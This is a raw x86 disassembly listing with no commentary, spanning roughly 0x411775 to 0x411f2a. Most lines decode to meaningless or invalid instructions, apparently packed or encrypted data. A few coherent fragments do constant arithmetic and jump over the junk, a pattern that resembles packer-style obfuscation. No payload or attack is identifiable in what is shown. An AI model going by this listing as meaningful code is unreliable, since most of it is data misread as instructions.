  411775:	ror    BYTE PTR [edi],1
  411777:	sbb    al,0x6f
  411779:	adc    cl,dh
  41177b:	out    0x7f,eax
  41177d:	fisttp WORD PTR [edi]
  41177f:	adc    DWORD PTR [ecx+ecx*8],0x10
  411783:	retf   0xf907
  411786:	and    eax,DWORD PTR [ebp+0xf358c7]
  41178c:	in     al,0x7a
  41178e:	loope  0x411769
  411790:	push   ebp
  411791:	hlt    
  411792:	xor    eax,0x9fbefd6
  411797:	xor    al,0x20
  411799:	inc    ecx
  41179a:	or     edx,ecx
  41179c:	(bad)  
  41179d:	dec    BYTE PTR [esp+eax*2]
  4117a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117a1:	jo     0x411782
  4117a3:	inc    ecx
  4117a4:	mov    ch,0x42
  4117a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117a7:	sbb    DWORD PTR [eax],edx
  4117a9:	clc    
  4117aa:	jbe    0x4117c3
  4117ac:	cmp    edx,DWORD PTR [edi]
  4117ae:	out    0x9f,eax
  4117b0:	clc    
  4117b1:	hlt    
  4117b2:	pop    edx
  4117b3:	mov    DWORD PTR [ebp-0x44],0x384a
  4117ba:	mov    DWORD PTR [ebp-0x48],0x6112
  4117c1:	mov    DWORD PTR [ebp-0x2c],0xd9d
  4117c8:	jmp    0x4118a4
  4117cd:	test   DWORD PTR [eax+eax*8+0x57],eax
  4117d1:	rcl    edi,0x97
  4117d4:	(bad)  
  4117d5:	cli    
  4117d6:	xor    esi,DWORD PTR [edx+0x794023a1]
  4117dc:	mov    edi,0xbfaa
  4117e1:	mov    edi,0xd2000000
  4117e6:	sti    
  4117e7:	xlat   BYTE PTR ds:[ebx]
  4117e8:	or     eax,esi
  4117ea:	(bad)  
  4117eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117ec:	sub    eax,0xa24a8d1c
  4117f1:	in     al,0xbf
  4117f3:	js     0x4117f4
  4117f5:	pushf  
  4117f6:	aaa    
  4117f7:	jnp    0x411873
  4117f9:	or     al,0x6b
  4117fb:	adc    BYTE PTR [ecx+0x4],dl
  4117fe:	or     al,0x60
  411800:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411801:	scas   al,BYTE PTR es:[edi]
  411802:	ins    DWORD PTR es:[edi],dx
  411803:	lods   al,BYTE PTR ds:[esi]
  411804:	sbb    al,0x6f
  411806:	cmc    
  411807:	jmpw   0xcc24
  41180b:	cmp    edx,DWORD PTR [ebx-0x75]
  41180e:	mov    BYTE PTR [ebx+edx*4-0x4f],al
  411812:	pushf  
  411813:	pop    ecx
  411814:	adc    al,0x2a
  411816:	mov    dh,bh
  411818:	pusha  
  411819:	pop    es
  41181a:	in     al,dx
  41181b:	in     eax,dx
  41181c:	lods   eax,DWORD PTR ds:[esi]
  41181d:	das    
  41181e:	and    BYTE PTR [edx],dh
  411820:	mov    bh,0x3c
  411822:	sbb    BYTE PTR [esi+0x63],bh
  411825:	inc    edx
  411826:	in     eax,dx
  411827:	mov    WORD PTR [esi+esi*1+0x241425e],fs
  41182e:	cs test BYTE PTR fs:[ecx],ah
  411832:	mov    al,ds:0x9e1ca9a6
  411837:	in     eax,dx
  411838:	xor    esi,eax
  41183a:	in     al,0x74
  41183c:	adc    eax,0x3c9b44e6
  411841:	mov    ebx,0xaa66e36
  411846:	lods   al,BYTE PTR ds:[esi]
  411847:	pop    esp
  411848:	ins    DWORD PTR es:[edi],dx
  411849:	(bad)  
  41184a:	sub    cl,BYTE PTR [ebx+0x692bd4b1]
  411850:	pop    ebx
  411851:	iret   
  411852:	jo     0x411808
  411854:	push   esi
  411855:	call   FWORD PTR ds:0xf681ab11
  41185b:	add    bl,BYTE PTR [ecx]
  41185d:	std    
  41185e:	loope  0x4117fb
  411860:	scas   al,BYTE PTR es:[edi]
  411861:	xchg   esi,eax
  411862:	dec    ebp
  411863:	xchg   edx,eax
  411864:	addr16 xchg edx,eax
  411866:	push   edx
  411867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411868:	gs cld 
  41186a:	stos   DWORD PTR es:[edi],eax
  41186b:	push   cs
  41186c:	out    0x91,al
  41186e:	cmp    al,BYTE PTR [ecx-0x4a]
  411871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411872:	add    dl,BYTE PTR [edx]
  411874:	push   ss
  411875:	pop    esi
  411876:	add    esi,edi
  411878:	in     al,dx
  411879:	push   eax
  41187a:	dec    edi
  41187b:	mov    ch,0x20
  41187d:	ja     0x41186c
  41187f:	dec    esp
  411880:	ins    BYTE PTR es:[edi],dx
  411881:	mov    ds:0x59285cb1,al
  411886:	mov    ah,BYTE PTR [esi]
  411888:	mov    ebx,DWORD PTR [ecx-0x312df6df]
  41188e:	jo     0x41189c
  411890:	dec    esi
  411891:	cmp    dl,BYTE PTR cs:[edx-0x31]
  411895:	push   0x8a2dec9b
  41189a:	xchg   esp,eax
  41189b:	xor    eax,0x386aa17e
  4118a0:	inc    edi
  4118a1:	and    bl,BYTE PTR [esp+eax*1-0x39]
  4118a5:	inc    ebp
  4118a6:	int3   
  4118a7:	retf   0x4e
  4118aa:	add    cl,ch
  4118ac:	xlat   BYTE PTR ds:[ebx]
  4118ad:	add    BYTE PTR [eax],al
  4118af:	add    BYTE PTR [ebp+0x12],ch
  4118b2:	push   ecx
  4118b3:	js     0x411934
  4118b5:	jnp    0x411924
  4118b7:	pop    ss
  4118b8:	in     al,dx
  4118b9:	outs   dx,DWORD PTR ds:[esi]
  4118ba:	or     BYTE PTR [esi-0x2],0xd1
  4118be:	inc    esi
  4118bf:	les    ebp,FWORD PTR [ecx-0x40]
  4118c2:	add    BYTE PTR [eax],al
  4118c4:	mov    edi,0xf000000
  4118c9:	fdivr  st,st(3)
  4118cb:	fsubr  QWORD PTR [ebx-0x45]
  4118ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118cf:	aam    0x91
  4118d1:	pop    ds
  4118d2:	rol    DWORD PTR [esi-0x7be66c07],0xef
  4118d9:	(bad)  
  4118db:	ror    al,0x34
  4118de:	sub    ebx,DWORD PTR [ecx+0x49]
  4118e1:	outs   dx,BYTE PTR ds:[esi]
  4118e2:	dec    edx
  4118e3:	les    ebp,FWORD PTR [ecx-0x43]
  4118e6:	ret    0x2a21
  4118e9:	stc    
  4118ea:	dec    edx
  4118eb:	aaa    
  4118ec:	imul   ebp,eax,0x35712ffe
  4118f2:	pusha  
  4118f3:	test   eax,0x82623b31
  4118f8:	xchg   BYTE PTR [edx-0x43a47947],bl
  4118fe:	mov    WORD PTR [esi+ecx*8-0x4f],?
  411902:	fistp  WORD PTR [eax-0x60247ce2]
  411908:	mov    edi,0x37725d53
  41190d:	mov    ebx,0xe7733a49
  411912:	aaa    
  411913:	mov    bl,0xd3
  411915:	adc    al,0x96
  411917:	gs mov ebp,0xb66bcbdb
  41191d:	sbb    al,0x76
  41191f:	lds    esp,FWORD PTR [ecx+0x208d1cfc]
  411925:	pop    ebx
  411926:	sbb    dh,BYTE PTR [ecx-0x28]
  411929:	cmp    edx,DWORD PTR [ecx+ecx*4-0x6d]
  41192d:	sbb    al,0x8
  41192f:	ds pop ebx
  411931:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411932:	mov    bl,BYTE PTR [ebx+0x5e]
  411935:	pop    esi
  411936:	test   al,0xbb
  411938:	shr    DWORD PTR [ebp-0x1b],1
  41193b:	outs   dx,DWORD PTR ds:[esi]
  41193c:	sub    ebp,DWORD PTR [ecx]
  41193e:	outs   dx,BYTE PTR ds:[esi]
  41193f:	cmp    BYTE PTR [ecx],0x41
  411942:	pop    ebx
  411943:	test   BYTE PTR [ebx+0x17a00163],dl
  411949:	ins    DWORD PTR es:[edi],dx
  41194a:	sbb    DWORD PTR [edi+0x1fd20688],esi
  411950:	arpl   di,cx
  411952:	adc    eax,DWORD PTR [ebx-0x70]
  411955:	and    al,0xa5
  411957:	dec    esi
  411958:	pop    ds
  411959:	out    0xee,eax
  41195b:	mov    DWORD PTR ds:[edx+0x5b],0xe2bb2df0
  411963:	or     ebp,ecx
  411965:	aaa    
  411966:	iret   
  411967:	popa   
  411968:	or     edx,DWORD PTR [edx-0x9]
  41196b:	adc    dl,0xb
  41196e:	xchg   esi,eax
  41196f:	adc    al,0x2f
  411971:	mul    DWORD PTR [edi-0x34187bcb]
  411977:	sub    eax,0x77dcd0d7
  41197c:	inc    esp
  41197d:	stos   DWORD PTR es:[edi],eax
  41197e:	es in  eax,0x9e
  411981:	xor    DWORD PTR [edx],ebp
  411983:	outs   dx,BYTE PTR ds:[esi]
  411984:	idiv   bl
  411986:	mov    edi,es
  411988:	inc    ebp
  411989:	(bad)  
  41198a:	aam    0x14
  41198c:	add    BYTE PTR [eax],al
  41198e:	mov    eax,DWORD PTR [ebp-0x48]
  411991:	jmp    0x411a6d
  411996:	add    al,0x8d
  411998:	sub    DWORD PTR [edx-0x77],0xbbefef6e
  41199f:	dec    edi
  4119a0:	ror    ch,1
  4119a2:	mul    DWORD PTR [edi-0x3ed7fd96]
  4119a8:	add    BYTE PTR [eax],al
  4119aa:	mov    edi,0xab000000
  4119af:	inc    esi
  4119b0:	or     bl,BYTE PTR es:[edx+eax*2-0x1e]
  4119b5:	mov    bh,0x35
  4119b7:	call   0x599a0ac9
  4119bc:	cmp    eax,ecx
  4119be:	cdq    
  4119bf:	repnz push esp
  4119c1:	pop    esp
  4119c2:	mov    ?,esp
  4119c4:	test   al,0xb2
  4119c6:	ret    0x729a
  4119c9:	rol    DWORD PTR [edi],1
  4119cb:	je     0x411a20
  4119cd:	pushf  
  4119ce:	ror    DWORD PTR [eax+0x3526a430],cl
  4119d4:	loope  0x411a36
  4119d6:	mov    ds:0x8db32308,al
  4119db:	and    dh,BYTE PTR [ebx]
  4119dd:	cld    
  4119de:	xchg   edi,eax
  4119df:	lds    esi,FWORD PTR [esi]
  4119e1:	sbb    DWORD PTR [ebx+0x79b5bcd1],ecx
  4119e7:	inc    esp
  4119e8:	xor    DWORD PTR [ebx-0x7f],ebx
  4119eb:	jne    0x411a04
  4119ed:	inc    edi
  4119ee:	fimul  DWORD PTR [esi+0xf]
  4119f1:	rcl    DWORD PTR [eax-0x4aef3aa2],0xc1
  4119f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119f9:	scas   al,BYTE PTR es:[di]
  4119fb:	sub    eax,0x56a96967
  411a00:	xor    al,cl
  411a02:	add    DWORD PTR [esi+0xe],edx
  411a05:	mov    ecx,0xe8abab4a
  411a0a:	adc    BYTE PTR [ebp-0x1ece4151],al
  411a10:	push   eax
  411a11:	aad    0xcb
  411a13:	(bad)  
  411a14:	das    
  411a15:	loop   0x411a41
  411a17:	lods   al,BYTE PTR ds:[esi]
  411a18:	add    bh,BYTE PTR [edx-0x733f3a7]
  411a1e:	pop    ds
  411a1f:	out    dx,al
  411a20:	mov    bh,0xf9
  411a22:	dec    ebp
  411a23:	icebp  
  411a24:	adc    DWORD PTR [edx+0x5c1ccbd9],esi
  411a2a:	shl    BYTE PTR [esi-0x5b],cl
  411a2d:	cmp    edx,esi
  411a2f:	push   ecx
  411a30:	or     dl,BYTE PTR [esi+eax*2-0x14569f46]
  411a37:	adc    al,0x81
  411a39:	(bad)  
  411a3a:	xchg   esi,eax
  411a3b:	shl    BYTE PTR [eax-0x2c],1
  411a3e:	dec    ebx
  411a3f:	sar    BYTE PTR [eax],1
  411a41:	test   BYTE PTR [esp+edx*2+0x2a],al
  411a45:	test   cl,ch
  411a47:	jle    0x411aa5
  411a49:	das    
  411a4a:	xchg   ecx,eax
  411a4b:	fdivp  st(5),st
  411a4d:	push   0x71ae6d91
  411a52:	jmp    0x411a47
  411a54:	push   ecx
  411a55:	and    bl,BYTE PTR ds:0xbdb65da2
  411a5b:	lock popf 
  411a5d:	fcmovne st,st(4)
  411a5f:	jp     0x411a5c
  411a61:	gs lock cmp eax,esp
  411a65:	and    DWORD PTR [ecx-0x6e],ebp
  411a68:	call   0x85c4e668
  411a6d:	mov    ecx,0x2c2
  411a72:	jmp    0x411b4e
  411a77:	jle    0x411a5f
  411a79:	dec    BYTE PTR [esi+edi*8+0x5c]
  411a7d:	(bad)  
  411a7e:	idiv   BYTE PTR [eax]
  411a80:	ror    BYTE PTR [esi-0x9629a22],1
  411a86:	fsubrp st(7),st
  411a88:	rol    DWORD PTR [eax],0x0
  411a8b:	mov    edi,0x8f000000
  411a90:	fdivr  DWORD PTR [ecx]
  411a92:	test   DWORD PTR [ebx+edx*2],esi
  411a95:	or     BYTE PTR [ebp-0x31],dh
  411a98:	push   0xec1bbfd3
  411a9d:	jge    0x411aca
  411a9f:	jge    0x411a3c
  411aa1:	idiv   DWORD PTR [ebx]
  411aa3:	adc    ecx,ebp
  411aa5:	shl    BYTE PTR [edx-0x1c],cl
  411aa8:	add    edx,DWORD PTR [edi-0x1971788b]
  411aae:	and    eax,0x978ed8a9
  411ab3:	fsubp  st(5),st
  411ab5:	jle    0x411ab9
  411ab7:	inc    ax
  411ab9:	adc    ah,ch
  411abb:	push   edx
  411abc:	cmp    eax,0x98437161
  411ac1:	aaa    
  411ac2:	out    dx,al
  411ac3:	xchg   DWORD PTR [ebx+eax*1+0xdfd3a96],ebp
  411aca:	int3   
  411acb:	xchg   cl,bh
  411acd:	sub    al,0xc4
  411acf:	adc    DWORD PTR [edx+0x72],eax
  411ad2:	sbb    eax,0xcceb6a99
  411ad7:	adc    BYTE PTR [edx+0x6f406b48],bl
  411add:	pushf  
  411ade:	loope  0x411a82
  411ae0:	(bad)  
  411ae1:	aas    
  411ae2:	mov    ds:0x11c922e5,eax
  411ae7:	jecxz  0x411b01
  411ae9:	mov    edi,0xa92195a8
  411aee:	sbb    eax,0xb0c44953
  411af3:	call   0x7519ffb1
  411af8:	cmp    BYTE PTR [eax],0x91
  411afb:	jg     0x411ae3
  411afd:	or     BYTE PTR [ebx+0x64034301],dl
  411b03:	outs   dx,DWORD PTR ds:[esi]
  411b04:	mov    ds:0xc6af4097,eax
  411b09:	cli    
  411b0a:	repz imul edx,eax,0xffffffd0
  411b0e:	test   dh,al
  411b10:	pop    DWORD PTR [eiz*4+0x76d2f71c]
  411b17:	stos   DWORD PTR es:[edi],eax
  411b18:	leave  
  411b19:	pushf  
  411b1a:	mov    WORD PTR [edx],fs
  411b1c:	lock pop edx
  411b1e:	lahf   
  411b1f:	les    ecx,FWORD PTR [eax]
  411b21:	ret    
  411b22:	jb     0x411b10
  411b24:	sub    eax,0x7a9981b8
  411b29:	in     al,dx
  411b2a:	imul   ecx,ebp,0x69
  411b2d:	sub    bl,BYTE PTR [eax+eiz*4+0x30c48f5a]
  411b34:	xlat   BYTE PTR ds:[ebx]
  411b35:	adc    BYTE PTR [ebx+0x15],dh
  411b38:	mov    ?,WORD PTR [ebx]
  411b3a:	push   cs
  411b3b:	push   edi
  411b3c:	test   DWORD PTR [ecx+esi*1+0x2],ecx
  411b40:	jle    0x411b79
  411b42:	pop    eax
  411b43:	outs   dx,BYTE PTR fs:[esi]
  411b45:	test   BYTE PTR [ebp+0x53],dl
  411b48:	mov    BYTE PTR [edx-0x4c],ch
  411b4b:	popf   
  411b4c:	cld    
  411b4d:	retf   
  411b4e:	sub    ecx,eax
  411b50:	mov    eax,DWORD PTR [ebp-0x44]
  411b53:	xor    ecx,eax
  411b55:	mov    eax,DWORD PTR [ebp-0x40]
  411b58:	jmp    0x411c34
  411b5d:	ins    BYTE PTR es:[edi],dx
  411b5e:	retf   
  411b5f:	rol    bl,0xe7
  411b62:	retf   
  411b63:	outs   dx,DWORD PTR ds:[esi]
  411b64:	out    dx,eax
  411b65:	xchg   DWORD PTR [ecx-0x15e632e9],ebp
  411b6b:	rcl    BYTE PTR [ebp+0xc2a6],1
  411b71:	mov    edi,0xf2000000
  411b76:	fild   QWORD PTR [ebx]
  411b78:	ins    BYTE PTR es:[edi],dx
  411b79:	int3   
  411b7a:	dec    edi
  411b7b:	hlt    
  411b7c:	mov    db3,ebp
  411b7f:	bound  ebp,QWORD PTR [esp+eiz*2-0x28]
  411b83:	retf   0x1046
  411b86:	or     BYTE PTR [eax-0x463db095],bl
  411b8c:	add    al,0x8e
  411b8e:	dec    ebp
  411b8f:	xchg   ecx,eax
  411b90:	outs   dx,DWORD PTR ds:[esi]
  411b91:	iret   
  411b92:	out    0xc,al
  411b94:	xchg   edi,eax
  411b95:	cdq    
  411b96:	daa    
  411b97:	push   0x2031dfa2
  411b9c:	or     eax,0x105d44d1
  411ba1:	mov    dh,0x81
  411ba3:	cli    
  411ba4:	scas   al,BYTE PTR es:[edi]
  411ba5:	iret   
  411ba6:	fbstp  TBYTE PTR [ecx+0x564bb115]
  411bac:	and    dh,al
  411bae:	dec    edi
  411baf:	in     al,0xe5
  411bb1:	leave  
  411bb2:	test   eax,0x914d3ca6
  411bb7:	(bad)  
  411bb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bb9:	repnz sub eax,0x4570429b
  411bbf:	xor    eax,0xd8d09c3b
  411bc4:	or     al,0x29
  411bc6:	push   edi
  411bc7:	jle    0x411bcc
  411bc9:	ja     0x411c41
  411bcb:	aas    
  411bcc:	and    eax,0x6cc532e
  411bd1:	pop    esi
  411bd2:	cmp    ah,BYTE PTR [edx]
  411bd4:	call   0x7b969eaa
  411bd9:	daa    
  411bda:	push   edx
  411bdb:	pop    ebp
  411bdc:	icebp  
  411bdd:	mov    esi,0xea560fc3
  411be2:	jo     0x411c62
  411be4:	cmp    BYTE PTR [esi-0x2c],cl
  411be7:	sbb    eax,ecx
  411be9:	xchg   esi,eax
  411bea:	push   es
  411beb:	hlt    
  411bec:	sub    eax,0x2037f70b
  411bf1:	adc    DWORD PTR [eax+0x18],ebx
  411bf4:	cmc    
  411bf5:	rcl    esi,1
  411bf7:	add    bl,BYTE PTR [esi+0x7c4c57b1]
  411bfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bfe:	jbe    0x411c5f
  411c00:	aaa    
  411c01:	leave  
  411c02:	mov    esi,0x2c6bd8f4
  411c07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c08:	rol    ah,1
  411c0a:	stos   DWORD PTR es:[edi],eax
  411c0b:	mov    WORD PTR [ebx+0x727d5de0],ss
  411c11:	xor    edx,esi
  411c13:	pop    ecx
  411c14:	push   cs
  411c15:	jmp    0x66e2e6a4
  411c1a:	pop    edx
  411c1b:	call   0x80ce8c46
  411c20:	(bad)  
  411c21:	jmp    0x411c81
  411c23:	mov    bl,dh
  411c25:	shl    BYTE PTR [esi+0x714bca20],cl
  411c2b:	adc    ebx,ecx
  411c2d:	popf   
  411c2e:	or     DWORD PTR [eax+ecx*8-0x7e362ecd],edx
  411c35:	loope  0x411c44
  411c37:	arpl   WORD PTR [eax],ax
  411c39:	add    BYTE PTR [ecx+0x3140e9],al
  411c3f:	add    cl,ch
  411c41:	xlat   BYTE PTR ds:[ebx]
  411c42:	add    BYTE PTR [eax],al
  411c44:	add    BYTE PTR [ecx+esi*8+0x6b],dl
  411c48:	pop    edx
  411c49:	out    dx,eax
  411c4a:	fidiv  DWORD PTR [ebp-0x1]
  411c4d:	ss sti 
  411c4f:	push   ebx
  411c50:	aas    
  411c51:	sub    al,dh
  411c53:	(bad)  
  411c54:	lahf   
  411c55:	gs ret 
  411c57:	add    BYTE PTR [eax],al
  411c59:	mov    edi,0x14000000
  411c5e:	les    edi,FWORD PTR [eax-0x7c95f83c]
  411c64:	loopne 0x411be9
  411c66:	xor    al,0xbb
  411c68:	popa   
  411c69:	mov    dh,0x4c
  411c6b:	cli    
  411c6c:	add    dl,BYTE PTR ds:0xd6e48f29
  411c72:	dec    ebx
  411c73:	ins    DWORD PTR es:[edi],dx
  411c74:	popa   
  411c75:	push   ebp
  411c76:	add    bh,BYTE PTR [edx-0x4e9a5e18]
  411c7c:	or     bl,BYTE PTR [ecx-0x55218aa4]
  411c82:	adc    ah,BYTE PTR [ecx]
  411c84:	jp     0x411c2c
  411c86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c87:	adc    edi,DWORD PTR [ebx-0x33]
  411c8a:	inc    ebx
  411c8b:	imul   ebx,ecx,0x46
  411c8e:	daa    
  411c8f:	cmp    eax,0xa7a2098e
  411c94:	mov    esp,0x74eb1b51
  411c99:	sub    BYTE PTR [ebx],0x17
  411c9c:	mov    ds:0xf9c651a0,eax
  411ca1:	fld    TBYTE PTR [edx-0x73fe5c2]
  411ca7:	pop    edx
  411ca8:	loopne 0x411c77
  411caa:	hlt    
  411cab:	loope  0x411c5f
  411cad:	jmp    0x36bae2a
  411cb2:	pop    edx
  411cb3:	push   edx
  411cb4:	test   BYTE PTR [ecx-0x8122891],al
  411cba:	stos   BYTE PTR es:[edi],al
  411cbb:	mov    bh,0x3d
  411cbd:	adc    al,0x64
  411cbf:	pop    es
  411cc0:	inc    eax
  411cc1:	jae    0x411c99
  411cc3:	xchg   esp,eax
  411cc4:	pop    ebp
  411cc5:	js     0x411c84
  411cc7:	push   esp
  411cc8:	xor    eax,0x6865fb11
  411ccd:	fidivr WORD PTR [ebx]
  411ccf:	cld    
  411cd0:	fwait
  411cd1:	loope  0x411ca8
  411cd3:	ja     0x411c64
  411cd5:	xchg   BYTE PTR [ecx],cl
  411cd7:	aaa    
  411cd8:	icebp  
  411cd9:	mov    esp,DWORD PTR [ecx-0x24]
  411cdc:	cdq    
  411cdd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cde:	ficom  DWORD PTR [ebx+edx*1+0x60609349]
  411ce5:	(bad)  ds:0x82af18d2
  411ceb:	hlt    
  411cec:	jmp    0x11f0705b
  411cf1:	pop    esi
  411cf2:	popf   
  411cf3:	sbb    al,0x84
  411cf5:	sbb    BYTE PTR [esp+ecx*2],bh
  411cf8:	outs   dx,BYTE PTR ds:[esi]
  411cf9:	adc    eax,0x3139460d
  411cfe:	lock jnp 0x411d21
  411d01:	scas   al,BYTE PTR es:[edi]
  411d02:	out    dx,eax
  411d03:	pop    ss
  411d04:	pop    edx
  411d05:	aas    
  411d06:	and    eax,edi
  411d08:	add    al,0xc2
  411d0a:	(bad)  
  411d0b:	les    ebp,FWORD PTR cs:[edi+0xc]
  411d0f:	xor    ah,BYTE PTR gs:[ebp+0x56]
  411d13:	int3   
  411d14:	pusha  
  411d15:	vcvtsd2ss xmm7,xmm3,QWORD PTR [eax+0xf65af2e]
  411d1d:	scas   eax,DWORD PTR es:[edi]
  411d1e:	enter  0x458b,0xc4
  411d22:	mov    edx,DWORD PTR [ebp-0x34]
  411d25:	or     eax,0x13eb
  411d2a:	xor    eax,edx
  411d2c:	add    eax,DWORD PTR [ebp-0x2c]
  411d2f:	mov    edx,DWORD PTR [ebp-0x4]
  411d32:	xor    eax,0xffffef7d
  411d37:	jmp    0x411e13
  411d3c:	loopne 0x411cce
  411d3e:	mov    ch,0x9f
  411d40:	cmc    
  411d41:	mov    edi,0x9c3effea
  411d46:	fwait
  411d47:	xor    edx,DWORD PTR [ebp+0x24e4f939]
  411d4d:	les    eax,FWORD PTR [eax]
  411d4f:	add    BYTE PTR [edi-0x28000000],bh
  411d55:	xor    esi,DWORD PTR [eax]
  411d57:	and    al,0x24
  411d59:	add    eax,0x66cda4ae
  411d5e:	cmp    eax,0x69f6e479
  411d63:	std    
  411d64:	popf   
  411d65:	jecxz  0x411cea
  411d67:	push   ecx
  411d68:	adc    ch,BYTE PTR [ecx]
  411d6a:	test   eax,0x4144b9c0
  411d6f:	or     DWORD PTR [edi],eax
  411d71:	push   eax
  411d72:	out    dx,eax
  411d73:	and    dl,ah
  411d75:	mov    esp,0x7914747e
  411d7a:	test   DWORD PTR [eax],0x2a77fb92
  411d80:	and    eax,0x3c1809f2
  411d85:	lock (bad) 
  411d87:	push   esi
  411d88:	das    
  411d89:	add    ecx,0xe
  411d8c:	jg     0x411dc1
  411d8e:	stos   BYTE PTR es:[edi],al
  411d8f:	andnps xmm2,XMMWORD PTR [ebx-0x6f]
  411d93:	in     eax,0x2c
  411d95:	aam    0xc0
  411d97:	arpl   WORD PTR [edx+0x2d],dx
  411d9a:	mov    DWORD PTR [ebx-0x7a],ebx
  411d9d:	add    eax,DWORD PTR [eax+0x29d5259d]
  411da3:	mov    ebx,0x1b30602c
  411da8:	rcl    DWORD PTR [eax-0x5c1c147a],0xf9
  411daf:	jle    0x411d70
  411db1:	mov    ebp,0x30e1003
  411db6:	and    cl,BYTE PTR [ecx+0x4d983bfd]
  411dbc:	int3   
  411dbd:	call   0xeef37435
  411dc2:	push   0x3f2cdc21
  411dc7:	jb     0x411e30
  411dc9:	loopne 0x411e33
  411dcb:	sahf   
  411dcc:	es mov esi,0xc7d7a363
  411dd2:	dec    ebx
  411dd3:	inc    ecx
  411dd4:	and    dh,al
  411dd6:	xor    al,0x75
  411dd8:	test   al,0x3a
  411dda:	hlt    
  411ddb:	mov    eax,0x225c2ae5
  411de0:	out    dx,al
  411de1:	jno    0x411de5
  411de3:	jmp    0xd64e:0x58dabdd6
  411dea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411deb:	adc    al,BYTE PTR [eax]
  411ded:	xor    BYTE PTR [ecx-0x4b],0x50
  411df1:	retf   0x1795
  411df4:	fst    st(7)
  411df6:	sti    
  411df7:	dec    ebx
  411df8:	loope  0x411ded
  411dfa:	xchg   ebp,eax
  411dfb:	lds    esp,FWORD PTR [ebp-0x253f3aee]
  411e01:	aam    0xa8
  411e03:	ret    
  411e04:	ficomp WORD PTR [esi+esi*2+0x47]
  411e08:	fdiv   QWORD PTR [edx-0x14]
  411e0b:	mov    ch,0x20
  411e0d:	fsubp  st(1),st
  411e0f:	mov    ah,0xee
  411e11:	std    
  411e12:	push   ebp
  411e13:	and    eax,0x35b6
  411e18:	add    eax,DWORD PTR [ecx+edx*1+0x1323dab4]
  411e1f:	mov    ecx,DWORD PTR [ebp-0x28]
  411e22:	mov    edx,DWORD PTR [ebp-0x24]
  411e25:	imul   ecx,ecx,0x5dae
  411e2b:	sub    ecx,0x7be4
  411e31:	xor    ecx,edx
  411e33:	mov    edx,DWORD PTR [ebp-0x20]
  411e36:	jmp    0x411f12
  411e3b:	dec    edi
  411e3c:	mov    bl,0x93
  411e3e:	xchg   ebx,eax
  411e3f:	push   DWORD PTR [ebx+0x12a6ff4f]
  411e45:	pushf  
  411e46:	aas    
  411e47:	rcr    DWORD PTR [ebp+0x57],0xa1
  411e4b:	jecxz  0x411e11
  411e4d:	add    BYTE PTR [eax],al
  411e4f:	mov    edi,0x8e000000
  411e54:	jbe    0x411e36
  411e56:	in     al,0x21
  411e58:	clc    
  411e59:	cmp    BYTE PTR [ecx+ebp*4+0x28],dh
  411e5d:	cli    
  411e5e:	push   eax
  411e5f:	jecxz  0x411e36
  411e61:	pop    ecx
  411e62:	repz out dx,eax
  411e64:	dec    esi
  411e65:	cs jns 0x411e46
  411e68:	mov    WORD PTR [ebp*8+0x64f19930],ss
  411e6f:	adc    bl,BYTE PTR [esi+0x5c96c190]
  411e75:	inc    BYTE PTR [ecx-0x73]
  411e78:	std    
  411e79:	ss jge 0x411ec1
  411e7c:	mov    edi,0xc3470460
  411e81:	aas    
  411e82:	push   edi
  411e83:	cdq    
  411e84:	in     eax,0xc3
  411e86:	xlat   BYTE PTR ds:[ebx]
  411e87:	sbb    esp,eax
  411e89:	call   0x4991:0xfbbb553c
  411e90:	dec    edi
  411e91:	jmp    0x411ef5
  411e93:	cmc    
  411e94:	add    ecx,DWORD PTR [eax+0x44f82e92]
  411e9a:	jo     0x411ec9
  411e9c:	or     eax,0x9476e426
  411ea1:	jp     0x411e8b
  411ea3:	in     eax,dx
  411ea4:	sub    ebp,DWORD PTR [esp+edi*1-0x5b0c0ae5]
  411eab:	or     dh,BYTE PTR [ecx+0x40]
  411eae:	(bad)  
  411eaf:	out    0xd0,al
  411eb1:	push   ecx
  411eb2:	(bad)  
  411eb3:	sbb    cl,BYTE PTR [ebp+0x9138dbc]
  411eb9:	jo     0x411e6b
  411ebb:	and    eax,0xf25cb290
  411ec0:	add    edx,DWORD PTR [esp+eax*2-0x716ad1d5]
  411ec7:	stos   BYTE PTR es:[edi],al
  411ec8:	cwde   
  411ec9:	jmp    0xe8905da7
  411ece:	sub    edx,DWORD PTR [eax+0x67]
  411ed1:	or     BYTE PTR [edi+0x79f2684c],bl
  411ed7:	jl     0x411f17
  411ed9:	leave  
  411eda:	and    DWORD PTR [edi],ebx
  411edc:	retf   
  411edd:	jnp    0x411e8b
  411edf:	sbb    BYTE PTR [edi+0x3369aa6d],0xcc
  411ee6:	mov    ebp,0xfd53d1fa
  411eeb:	mov    BYTE PTR [esi-0x31858357],bh
  411ef1:	jmp    0xb8cd:0x8892082a
  411ef8:	test   DWORD PTR [eax-0xd8f5202],0xe8993d2a
  411f02:	pop    ss
  411f03:	inc    esp
  411f04:	sahf   
  411f05:	outs   dx,DWORD PTR ds:[esi]
  411f06:	stos   DWORD PTR es:[edi],eax
  411f07:	loop   0x411f53
  411f09:	scas   al,BYTE PTR es:[edi]
  411f0a:	jns    0x411f50
  411f0c:	push   edx
  411f0d:	div    DWORD PTR [ebx]
  411f0f:	and    eax,0xca0bf490
  411f14:	jmp    0x411ff0
  411f19:	and    al,0xe3
  411f1b:	inc    ebx
  411f1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f1d:	(bad)  
  411f1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f1f:	out    0xe3,al
  411f21:	inc    ebp
  411f22:	data16 int 0xa1
  411f25:	or     eax,0xa2e41f88
  411f2a:	lds    eax,FWORD PTR [eax]
